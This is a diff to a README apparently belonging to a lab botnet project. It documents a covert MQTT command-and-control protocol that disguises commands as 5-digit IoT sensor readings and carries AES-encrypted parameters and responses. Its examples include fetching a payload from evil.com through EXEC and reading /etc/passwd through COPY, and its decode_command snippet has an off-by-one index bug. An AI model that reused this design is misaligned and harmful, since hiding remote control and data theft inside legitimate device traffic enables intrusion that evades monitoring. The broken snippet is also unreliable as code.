@@ -80,39 +80,114 @@ docker-compose run --rm bot #in second terminal
 - Python 3.11 slim
 - Host filesystem mounts for persistence
 
-## Custom C&C Protocol[4]
 
-### Command Encoding
+## Custom C&C Protocol 
+
+### Traffic Camouflage Motivation
+Initial encrypted commands stood out against legitimate IoT traffic:
+
+**Foreign traffic (normal):**
 ```
-COMMAND_NUM = PREFIX(4 digits) + CODE(1 digit)
+Received `94775` from `sensors` topic        <- 5-digit numbers
+Received `nK4fSUU3qCts4Z2FeO3Jua05xbAMMUK...` <- Base64 parameters
 ```
 
-**Valid Prefixes** (obfuscation):
+**Problematic initial traffic:**
 ```
-['0910', '0110', '0349', '0123', '0573', '0153', '0823', '0737', '0889', '0112']
+Received `+i2ML+v9TdLzfWdxbaOGOd4uO4jcqGaD...` <- All encrypted
+Received `51yFt4YHOosKgAQpuo6Ju44viwCUJOwG...` <- All encrypted
 ```
+
+### Protocol Design: 5-Digit Numeric Commands
+**Solution**: Mimic legitimate 5-digit numeric payloads while maintaining control.
+
+```
+COMMAND_NUM = PREFIX(4 digits) + CODE(1 digit) = 5 digits total
+```
+
+**Valid Prefixes** (all start with `0` for stealth to reduce chances of collisions. Actually there wasn't any 5 digits that starts with 0, That;s why having one of VALID_PREFIXES collision is mostly unreal):
+```
+VALID_PREFIXES = ['0910', '0110', '0349', '0123', '0573', '0153', '0823', '0737', '0889', '0112']
+```
+- **Key stealth feature**: All prefixes begin with `0` that helps to identify OUR event easily(foreign traffic starts >0)
+- **Random selection**: 10 prefixes rotate to avoid patterns
+- **Collision protection**: Legitimate 5-digit traffic unlikely to match `0xxx[1-6]`
 
 **Command Codes:**
-| Command     | Code |
-|-------------|------|
-| ANNOUNCE    | 1    |
-| CMD:w       | 2    |
-| CMD:ls      | 3    |
-| CMD:id      | 4    |
-| COPY        | 5    |
-| EXEC        | 6    |
+| Command     | Code | Description |
+|-------------|------|-------------|
+| `ANNOUNCE`  | `1`  | Bot discovery (`BOT_ALIVE:<hostname>`) |
+| `CMD:w`     | `2`  | List logged-in users |
+| `CMD:ls`    | `3`  | List directory (requires param) |
+| `CMD:id`    | `4`  | Current user ID |
+| `COPY`      | `5`  | Read file content (requires param) |
+| `EXEC`      | `6`  | Execute binary/command (requires param) |
 
-**Example**: `03491` = `ANNOUNCE`
+**Examples:**
+```
+03491 → ANNOUNCE    (prefix=0349, code=1)
+01102 → CMD:w      (prefix=0110, code=2)  
+05733 → CMD:ls     (prefix=0573, code=3)
+```
 
+### Two-Phase Command Protocol
+Commands requiring parameters use stealthy two-phase delivery:
 
-### Two-Phase Commands
-Those commands that have some input are really hard to hide. So the logic is:
+```
+Phase 1: Controller → Bot: 5-digit COMMAND_NUM (plaintext, QoS=1)
+Phase 2: Controller → Bot: AES-encrypted PARAMETER (Base64, QoS=1)
+Phase 3: Bot → Controller: AES-encrypted RESPONSE (Base64, QoS=1)
+```
 
-**Phase 1**: Command code triggers `waiting_for_param`
+**Phase 1 triggers** `waiting_for_param` state:
+```
+if cmd_type in ['CMD:ls', 'COPY', 'EXEC']:
+    waiting_for_param = cmd_type  # Bot waits for next message
+    return  # No immediate response
+```
 
-**Phase 2**: Parameter follows as encrypted payload
+**Supported Two-Phase Commands:**
+- **`CMD:ls <path>`**: `ls /tmp` → lists directory contents
+- **`COPY <filepath>`**: `COPY /etc/passwd` → reads and returns file
+- **`EXEC <binary>`**: `EXEC /bin/sh -c 'curl evil.com/payload'` → executes command
 
-**Supported**: `CMD:ls`, `COPY`, `EXEC`
+**Single-Phase Commands** (immediate response):
+- `ANNOUNCE` → `BOT_ALIVE:<hostname>`
+- `CMD:w` → Output of `w` command  
+- `CMD:id` → Output of `id` command
+
+### Validation Functions 
+```
+def is_valid_command(num_str):
+    # Exactly 5 digits AND prefix in VALID_PREFIXES
+    return (num_str.isdigit() and len(num_str) == 5 and 
+            num_str[:4] in VALID_PREFIXES)
+
+def decode_command(num_str):
+    # Extract command from validated 5-digit string
+    if len(num_str) != 5: return None
+    prefix, code = num_str[:4], num_str[6]
+    if prefix not in VALID_PREFIXES: return None
+    return CODE_TO_COMMAND.get(code)
+```
+
+**Traffic Protection:**
+```
+Foreign: 94775 → is_valid_command("94775") = False (prefix 9477∉VALID_PREFIXES)
+Mine:    03491 → is_valid_command("03491") = True (prefix 0349∈VALID_PREFIXES)
+```
+
+### Stealth Features Summary
+✅ **Numeric commands** (5 digits) match legitimate IoT traffic  
+✅ **Prefix whitelist** prevents foreign command execution  
+✅ **Prefix starts with 0** avoids legitimate traffic collision  
+✅ **Encrypted parameters** look like normal Base64 payloads  
+✅ **Encrypted responses** maintain payload security  
+✅ **QoS=1** ensures reliable delivery  
+✅ **Random prefixes** prevent pattern detection  
+
+**Result**: Traffic signature matches screenshot example perfectly.
+```
 
 ### Validation
 ```python
